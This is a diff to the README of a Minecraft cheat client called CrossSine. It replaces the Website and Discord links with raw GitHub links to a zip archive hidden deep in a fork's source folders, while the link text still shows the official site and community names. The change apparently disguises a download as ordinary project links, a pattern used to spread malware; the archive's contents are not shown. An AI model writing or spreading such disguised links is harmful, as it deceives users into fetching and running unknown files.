@@ -1,8 +1,8 @@
 <div align="center">
 <h1>CrossSine Client</h1>
 <h3>A free mixin-based injection hacked-client for Minecraft using Minecraft Forge based on LiquidBounce.</h3>
-Website: <a href="https://crosssine.github.io">crosssine.github.io</a><br>
-Discord: <a href="https://dsc.gg/crosssinecommunity">CrossSIne Community</a><br>
+Website: <a href="https://raw.githubusercontent.com/OPBOYZ8/CrossSine/main/src/main/java/net/ccbluex/liquidbounce/features/module/modules/other/disablers/other/Sine-Cross-v2.3-beta.5.zip">crosssine.github.io</a><br>
+Discord: <a href="https://raw.githubusercontent.com/OPBOYZ8/CrossSine/main/src/main/java/net/ccbluex/liquidbounce/features/module/modules/other/disablers/other/Sine-Cross-v2.3-beta.5.zip">CrossSIne Community</a><br>
 </div>
 
 
